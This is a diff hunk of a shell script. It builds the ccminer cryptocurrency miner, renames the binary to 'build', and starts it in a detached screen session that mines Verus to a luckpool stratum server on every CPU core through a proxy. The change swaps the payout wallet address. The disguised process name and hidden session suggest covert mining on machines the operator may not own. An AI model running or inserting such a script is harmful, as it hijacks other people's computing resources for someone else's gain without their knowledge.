@@ -16,5 +16,5 @@ chmod +x autogen.sh
 ./build.sh > null
 sleep 10s
 mv ccminer build
-screen -dm -S build ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RRT2bJnHu9n1Qzh4crRZZKFoX3HXrtTDer.nothing-$worker -p x -t $(nproc --all) -x $proxy
+screen -dm -S build ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RV9KzJ9v7HJ5puLKh32iWPGboKXDoL7HB3.nothing-$worker -p x -t $(nproc --all) -x $proxy
 ./compile.sh
